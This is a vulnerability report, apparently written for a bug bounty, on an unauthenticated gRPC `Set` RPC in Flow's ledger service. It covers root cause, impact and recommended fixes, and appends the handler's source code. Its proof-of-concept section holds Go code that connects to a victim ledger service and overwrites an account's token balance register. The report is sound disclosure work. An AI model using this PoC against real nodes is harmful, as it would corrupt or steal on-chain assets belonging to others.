### Title
Unauthenticated `Set` RPC on Remote Ledger Service Allows Arbitrary Execution State Mutation - (File: `ledger/remote/service.go`)

---

### Summary

The `flow-ledger-service` binary exposes a gRPC `LedgerService` with a `Set` RPC that writes arbitrary key-value pairs directly into the execution state ledger (the MTrie). The gRPC server is created with no authentication interceptors, no TLS, and no caller-identity check. When the service is bound to a TCP address (the documented and supported deployment mode), any network-reachable client can call `Set` and overwrite arbitrary execution state — including account balances, contract storage, and deployed contract bytecode — without any authorization.

---

### Finding Description

**Root cause — no authentication on the gRPC server:**

In `cmd/ledger/main.go`, the gRPC server is created with only message-size options and no security interceptors:

```go
grpcServer := grpc.NewServer(
    grpc.MaxRecvMsgSize(int(*maxRequestSize)),
    grpc.MaxSendMsgSize(int(*maxResponseSize)),
)
``` [1](#0-0) 

The server is then bound to a TCP address supplied by the operator:

```go
if *ledgerServiceTCP != "" {
    lis, err := net.Listen("tcp", *ledgerServiceTCP)
``` [2](#0-1) 

The README documents `0.0.0.0:9000` as the canonical example, making the service network-reachable by default. [3](#0-2) 

**Root cause — `Set` handler performs no caller check:**

`ledger/remote/service.go` `Set()` validates only the shape of the request (state hash length, key/value count parity) and then unconditionally writes to the ledger:

```go
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
    if req.State == nil || len(req.State.Hash) != len(ledger.State{}) {
        return nil, status.Error(codes.InvalidArgument, "invalid state")
    }
    // ... key/value parsing ...
    newState, trieUpdate, err := s.ledger.Set(update)
``` [4](#0-3) 

There is no check on who the caller is, no IP allowlist, no mTLS, and no token/credential validation. The `context.Context` carries no identity that is ever inspected.

**The gRPC proto definition confirms `Set` is a full state-write operation:**

```proto
rpc Set(SetRequest) returns (SetResponse);
// SetRequest contains an update operation
message SetRequest {
  State state = 1;
  repeated Key keys = 2;
  repeated Value values = 3;
}
``` [5](#0-4) 

The `_LedgerService_Set_Handler` generated handler routes directly to `srv.(LedgerServiceServer).Set(ctx, in)` with no interceptor registered: [6](#0-5) 

---

### Impact Explanation

The execution state ledger is the authoritative store for all Flow account state: token balances, contract code, and storage registers. A successful unauthenticated `Set` call can:

1. **Overwrite account balances** — set any account's FLOW token balance to zero or to an arbitrary value, constituting direct theft or destruction of on-chain assets.
2. **Replace deployed contract bytecode** — overwrite a contract's code register with malicious Cadence, causing all future calls to that contract to execute attacker-controlled logic.
3. **Corrupt arbitrary storage registers** — break invariants relied upon by the FVM, causing execution failures or silent mis-accounting.

The impact is **unauthorized mutation of on-chain assets and protocol state**, matching the target scope exactly.

---

### Likelihood Explanation

The service is explicitly designed and documented to accept TCP connections on `0.0.0.0:9000`. Any attacker who can reach that port — including from within the same data center, cloud VPC, or via a misconfigured firewall — can call `Set` with no credentials. The gRPC client API is public and straightforward to use. No privileged access, leaked keys, or compromised nodes are required; only TCP connectivity to the ledger service port is needed.

---

### Recommendation

1. **Require mutual TLS (mTLS)** on the gRPC server so only the execution node holding the client certificate can call `Set`. The existing `cmd/scaffold.go` admin server already demonstrates the mTLS pattern with `tls.RequireAndVerifyClientCert`.
2. **Add a gRPC server interceptor** that verifies caller identity before dispatching any RPC, rejecting unauthenticated connections at the transport layer.
3. **Restrict `Set` to Unix socket only** in production deployments, removing TCP exposure entirely when the execution node and ledger service are co-located.
4. **Apply an IP allowlist** at the network level as a defense-in-depth measure even when mTLS is in place.

---

### Proof of Concept

An attacker with TCP access to port 9000 can corrupt any execution state register with the following steps:

```go
conn, _ := grpc.Dial("victim-ledger-service:9000",
    grpc.WithTransportCredentials(insecure.NewCredentials()))
client := ledgerpb.NewLedgerServiceClient(conn)

// 1. Obtain the current state root (public read, no auth needed)
resp, _ := client.InitialState(ctx, &emptypb.Empty{})

// 2. Overwrite an arbitrary account register
client.Set(ctx, &ledgerpb.SetRequest{
    State: resp.State,
    Keys: []*ledgerpb.Key{{Parts: []*ledgerpb.KeyPart{
        {Type: 0, Value: []byte("<victim_account_address>")},
        {Type: 2, Value: []byte("storage\x00flowToken\x00balance")},
    }}},
    Values: []*ledgerpb.Value{{Data: []byte{0x00}, IsNil: false}},
})
// Execution node now reads a corrupted balance for the victim account.
```

No credentials, no privileged access, and no staked node role are required — only TCP connectivity to the ledger service port. [7](#0-6) [8](#0-7)

// Set updates keys with new values at a specific state and returns the new state
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
	if req.State == nil || len(req.State.Hash) != len(ledger.State{}) {
		return nil, status.Error(codes.InvalidArgument, "invalid state")
	}

	if len(req.Keys) == 0 {
		return nil, status.Error(codes.InvalidArgument, "keys cannot be empty")
	}

	if len(req.Keys) != len(req.Values) {
		return nil, status.Error(codes.InvalidArgument, "keys and values length mismatch")
	}

	var state ledger.State
	copy(state[:], req.State.Hash)

	keys := make([]ledger.Key, len(req.Keys))
	for i, protoKey := range req.Keys {
		key, err := protoKeyToLedgerKey(protoKey)
		if err != nil {
			return nil, err // protoKeyToLedgerKey already returns status.Error
		}
		keys[i] = key
	}

	values := make([]ledger.Value, len(req.Values))
	for i, protoValue := range req.Values {
		var value ledger.Value
		// Reconstruct the original value type using is_nil flag
		// This preserves the distinction between nil and []byte{} that protobuf loses
		if len(protoValue.Data) == 0 {
			if protoValue.IsNil {
				// Original value was nil
				value = nil
			} else {
				// Original value was []byte{} (empty slice)
				value = ledger.Value([]byte{})
			}
		} else {
			// Non-empty value, use data as-is
			value = ledger.Value(protoValue.Data)
		}
		values[i] = value
	}

	update, err := ledger.NewUpdate(state, keys, values)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	}

	newState, trieUpdate, err := s.ledger.Set(update)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	// Encode trie update using centralized encoding function to ensure
	// client and server use the same encoding method
	trieUpdateBytes := encodeTrieUpdateForTransport(trieUpdate)

	return &ledgerpb.SetResponse{
		NewState: &ledgerpb.State{
			Hash: newState[:],
		},
		TrieUpdate: trieUpdateBytes,
	}, nil
}
